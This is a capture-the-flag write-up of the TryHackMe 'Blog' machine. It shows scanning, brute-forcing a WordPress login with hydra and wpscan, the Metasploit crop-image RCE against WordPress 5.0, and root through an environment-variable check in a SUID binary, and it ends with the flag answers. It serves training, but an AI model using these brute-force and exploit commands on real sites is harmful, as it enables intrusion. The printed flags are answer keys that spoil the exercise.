---
layout: post
title: THM CTF Blog
tags: [THM, CTF, Privilege Escalation, Wordpress] 
date: 2023-09-21 23:30:34
toc:
    sidebar: left
    toc-depth: 3
---

## Introduction

In today's writeup, we'll try to enumerate and find flags on the machine that hosts the new blog of Billy Joel.

## Walkthrough

To begin with, we will firstly add blog.thm to our */etc/hosts* file (I'm working with kali linux).
(Don't forget to connect with openvpn to the network)

``` sh
sudo nano /etc/hosts
10.10.180.6 blog.thm
```

Then, I'll go for a quick nmap scan.

``` sh
┌──(kali㉿kali)-[~]
└─$ nmap -sT -T4 blog.thm
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-10 15:00 EDT
Nmap scan report for blog.thm (10.10.180.6)
Host is up (0.089s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 2.15 seconds
```

We see the machine may host a webservice.
When I try to connect to it using a browser, I'm welcomed by this.

![Website](/assets/img/images/thm_ctf_blog/BkITB77-a.png)

I use ffuf to fuzz the website and eventually get an interesting path.

``` sh
┌──(root㉿kali)-[/usr/share/seclists/Fuzzing]
└─# ffuf -w fuzz-Bo0oM.txt -u http://blog.thm/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://blog.thm/FUZZ
 :: Wordlist         : FUZZ: fuzz-Bo0oM.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________


adm/index.php           [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 400ms]
admin                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 447ms]
admin/                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 357ms]
admin/index.php         [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 395ms]
admin/mysql/index.php   [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 406ms]
admin/phpmyadmin/index.php [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 391ms]
admin/PMA/index.php     [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 381ms]
admin/pma/index.php     [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 381ms]
admin/phpMyAdmin/index.php [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 395ms]
admin/phpmyadmin2/index.php [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 404ms]
admin/mysql2/index.php  [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 418ms]
admin2/index.php        [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 430ms]
admin_area/index.php    [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 437ms]
adminarea/index.php     [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 413ms]
administrator/index.php [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 400ms]
apc/index.php           [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 420ms]
asset..                 [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 391ms]
axis//happyaxis.jsp     [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 451ms]
axis2-web//HappyAxis.jsp [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 472ms]
axis2//axis2-web/HappyAxis.jsp [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 455ms]
bb-admin/index.php      [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 390ms]
bitrix/admin/index.php  [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 423ms]
claroline/phpMyAdmin/index.php [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 448ms]
db/index.php            [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 394ms]
dbadmin/index.php       [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 440ms]
dswsbobje//happyaxis.jsp [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 454ms]
etc/lib/pChart2/examples/imageMap/index.php [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 432ms]
extjs/resources//charts.swf [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 426ms]
index.php               [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 454ms]
install/index.php?upgrade/ [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 438ms]
jboss-net//happyaxis.jsp [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 390ms]
license.txt             [Status: 200, Size: 19935, Words: 3334, Lines: 386, Duration: 41ms]
login                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 434ms]
login/                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 431ms]
modelsearch/index.php   [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 402ms]
myadmin/index.php       [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 398ms]
myadmin2/index.php      [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 418ms]
mysql-admin/index.php   [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 389ms]
mysql/index.php         [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 408ms]
mysqladmin/index.php    [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 431ms]
New%20folder%20(2)      [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 411ms]
panel-administracion/index.php [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 441ms]
phpadmin/index.php      [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 439ms]
phpma/index.php         [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 396ms]
phpmyadmin-old/index.php [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 407ms]
phpMyAdmin.old/index.php [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 407ms]
phpMyAdmin/index.php    [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 407ms]
phpMyAdmin/phpMyAdmin/index.php [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 404ms]
phpmyadmin/index.php    [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 411ms]
phpmyadmin/phpmyadmin/index.php [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 446ms]
phpmyadmin1/index.php   [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 396ms]
phpmyadmin0/index.php   [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 426ms]
phpmyadmin2/index.php   [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 408ms]
phpMyadmin_bak/index.php [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 400ms]
phpMyAdminold/index.php [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 416ms]
pma-old/index.php       [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 403ms]
PMA/index.php           [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 443ms]
pma/index.php           [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 441ms]
PMA2/index.php          [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 405ms]
pmd/index.php           [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 387ms]
pmamy/index.php         [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 434ms]
pmamy2/index.php        [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 432ms]
public..                [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 469ms]
readme.html             [Status: 200, Size: 7415, Words: 760, Lines: 99, Duration: 36ms]
robots.txt              [Status: 200, Size: 67, Words: 4, Lines: 4, Duration: 425ms]
roundcube/index.php     [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 405ms]
server-status/          [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 16ms]
siteadmin/index.php     [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 440ms]
sql/index.php           [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 462ms]
static..                [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 221ms]
templates/beez/index.php [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 379ms]
templates/ja-helio-farsi/index.php [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 393ms]
templates/rhuk_milkyway/index.php [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 397ms]
tmp/index.php           [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 408ms]
tools/phpMyAdmin/index.php [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 408ms]
typo3/phpmyadmin/index.php [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 412ms]
web/phpMyAdmin/index.php [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 389ms]
webadmin/index.php      [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 398ms]
wp-content/             [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 13ms]
wp-config.php           [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 366ms]
wp-content/upgrade/     [Status: 200, Size: 772, Words: 52, Lines: 16, Duration: 17ms]
wp-content/uploads/     [Status: 200, Size: 1152, Words: 76, Lines: 18, Duration: 26ms]
wp-includes/rss-functions.php [Status: 500, Size: 0, Words: 1, Lines: 1, Duration: 16ms]
wp-content/plugins/adminer/inc/editor/index.php [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 451ms]
wp-login.php            [Status: 200, Size: 3087, Words: 157, Lines: 70, Duration: 411ms]
wp-includes/            [Status: 200, Size: 42161, Words: 2443, Lines: 207, Duration: 500ms]
wp-register.php         [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 476ms]
wp-json/                [Status: 200, Size: 73052, Words: 3515, Lines: 1, Duration: 619ms]
wp-json/wp/v2/users/    [Status: 200, Size: 1096, Words: 3, Lines: 1, Duration: 712ms]
www/phpMyAdmin/index.php [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 435ms]
xampp/phpmyadmin/index.php [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 397ms]
wp-admin/               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 2743ms]
wp-admin/setup-config.php [Status: 500, Size: 2936, Words: 260, Lines: 123, Duration: 2827ms]
wp-admin/install.php    [Status: 200, Size: 1074, Words: 62, Lines: 15, Duration: 2922ms]
xmlrpc.php              [Status: 405, Size: 42, Words: 6, Lines: 1, Duration: 1194ms]

```

After that, I attempt to connect to the admin panel, but I don't have any usernames, and 'admin' doesn't work. I use hydra to test these.

``` sh
hydra -L top-usernames.txt -p test blog.thm http-post-form "/wp-login/:log=^USER^&pwd=^PASS^:F=Invalid username"
```

I have nothing concluant so I'll check if the Wordpress version has any vulnerabilites. I use metasploit coupled with the *wordpress_scanner* module.

``` sh
msf6 auxiliary(scanner/http/wordpress_scanner) > set rhosts blog.thm
rhosts => blog.thm
msf6 auxiliary(scanner/http/wordpress_scanner) > exploit

[*] Trying 10.10.180.6
[+] 10.10.180.6 - Detected Wordpress 5.0
[*] 10.10.180.6 - Enumerating Themes
[*] 10.10.180.6 - Progress  0/2 (0.0%)
[*] 10.10.180.6 - Finished scanning themes
[*] 10.10.180.6 - Enumerating plugins
[*] 10.10.180.6 - Progress   0/57 (0.0%)
[*] 10.10.180.6 - Finished scanning plugins
[*] 10.10.180.6 - Searching Users
[+] 10.10.180.6 - Detected user: Billy Joel with username: bjoel
[+] 10.10.180.6 - Detected user: Karen Wheeler with username: kwheel
[*] 10.10.180.6 - Finished scanning users
[*] 10.10.180.6 - Finished all scans
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

**What version of the above CMS was being used?**

*Answer: `5.0`*

Now we have the usernames, we also know the creator of this blog is Billy's mom. She might be the one who is the admin of the blog.
Let's try bruteforce her account using wpscan. (We could have used it before)

``` sh
──(root㉿kali)-[/usr/share/seclists/Passwords/Leaked-Databases]
└─# wpscan --url http://blog.thm -U kwheel -P rockyou.txt
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
                               
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] Updating the Database ...
[i] Update completed.

[+] URL: http://blog.thm/ [10.10.180.6]
[+] Started: Tue Oct 10 20:27:01 2023

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://blog.thm/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://blog.thm/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://blog.thm/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://blog.thm/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://blog.thm/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.0 identified (Insecure, released on 2018-12-06).
 | Found By: Rss Generator (Passive Detection)
 |  - http://blog.thm/feed/, <generator>https://wordpress.org/?v=5.0</generator>
 |  - http://blog.thm/comments/feed/, <generator>https://wordpress.org/?v=5.0</generator>

[+] WordPress theme in use: twentytwenty
 | Location: http://blog.thm/wp-content/themes/twentytwenty/
 | Last Updated: 2023-03-29T00:00:00.000Z
 | Readme: http://blog.thm/wp-content/themes/twentytwenty/readme.txt
 | [!] The version is out of date, the latest version is 2.2
 | Style URL: http://blog.thm/wp-content/themes/twentytwenty/style.css?ver=1.3
 | Style Name: Twenty Twenty
 | Style URI: https://wordpress.org/themes/twentytwenty/
 | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://blog.thm/wp-content/themes/twentytwenty/style.css?ver=1.3, Match: 'Version: 1.3'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:14 <=====================================> (137 / 137) 100.00% Time: 00:00:14

[i] No Config Backups Found.

[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - kwheel / cutiepie1                                                                                      
Trying kwheel / dallas1 Time: 00:03:20 <                                   > (2865 / 14347256)  0.01%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: kwheel, Password: cutiepie1

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Tue Oct 10 20:30:45 2023
[+] Requests Done: 3053
[+] Cached Requests: 7
[+] Data Sent: 1.469 MB
[+] Data Received: 22.193 MB
[+] Memory used: 272.641 MB
[+] Elapsed time: 00:03:44
```

``` sh
hydra -l kwheel -P rockyou.txt blog.thm http-post-form "/wp-login/:log=^USER^&pwd=^PASS^:F=The password you entered for the username kwheel is incorrect."
```

From now, we have an access to the admin panel but we can't really do anything for now because kwheel is in reality an author account.

![Dashboard](/assets/img/images/thm_ctf_blog/r1Upu4X-p.png)

To bypass these resctrictions, we have to use the RCE crop-image found on https://www.exploit-db.com/exploits/49512. In msfconsole, we can find a similar version.

``` metasploit
msf6 exploit(multi/http/wp_crop_rce) > options

Module options (exploit/multi/http/wp_crop_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD   cutiepie1        yes       The WordPress password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     blog.thm         yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wi
                                         ki/Using-Metasploit
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the wordpress application
   USERNAME   kwheel           yes       The WordPress username to authenticate with
   VHOST                       no        HTTP server virtual host
```

Now we have access to the blog's server, we can try to retrieve the user.txt flag.

``` sh
meterpreter > download /home/bjoel/user.txt
[*] Downloading: /home/bjoel/user.txt -> /root/user.txt
[*] Downloaded 57.00 B of 57.00 B (100.0%): /home/bjoel/user.txt -> /root/user.txt
[*] download   : /home/bjoel/user.txt -> /root/user.txt

┌──(root㉿kali)-[~]
└─# cat user.txt 
You won't find what you're looking for here.

TRY HARDER
```

Unfortunately, we don't get the excepted results. We need to dive deeper.
We may get useful informations in the pdf located in bjoel home folder.

``` sh
Bill Joel,
This letter is to inform you that your employment with Rubber Ducky Inc. will end effective immediately
on 5/20/2020.
You have been terminated for the following reasons:
• Repeated offenses regarding company removable media policy
• Repeated offenses regarding company Acceptable Use Policy
• Repeated offenses regarding tardiness
```

We use linpeas to enumerate or to try getting some interesting stuff.
After not getting anything useful, we tried to enumerate any SUID binary in almost every directory available. The most suspicious one */usr/bin/checker*.
We check it's behaviour by running it.

``` sh
/usr/sbin/checker
Not an Admin

```

After running ltrace to get more infos.

``` sh
ltrace /usr/sbin/checker
getenv("admin")                                  = nil
puts("Not an Admin")                             = 13
Not an Admin
+++ exited (status 0) +++
```

It looks that it checks if there is any environement variable with the name *"admin"*. With this acquired knowledge, we have to export a env var with the account *www-data*.

``` sh
export admin="nil";
/usr/sbin/checker
whoami
root
```

Now that we are root, we must retrieve the root.txt and user.txt flags.

``` sh
cat /root/root.txt
9a0b2b618bef9bfa7ac28c1353d9f318
find / -name "user.txt"
/home/bjoel/user.txt
/media/usb/user.txt
cat /media/usb/user.txt
c8421899aae571f7af486492b71a8ab7
```

**root.txt**

*Answer: `9a0b2b618bef9bfa7ac28c1353d9f318`*

**user.txt**

*Answer: `c8421899aae571f7af486492b71a8ab7`*

**Where was user.txt found?**

*Answer: `/media/usb/`*

**What CMS was Billy using?**

*Answer: `Wordpress`*
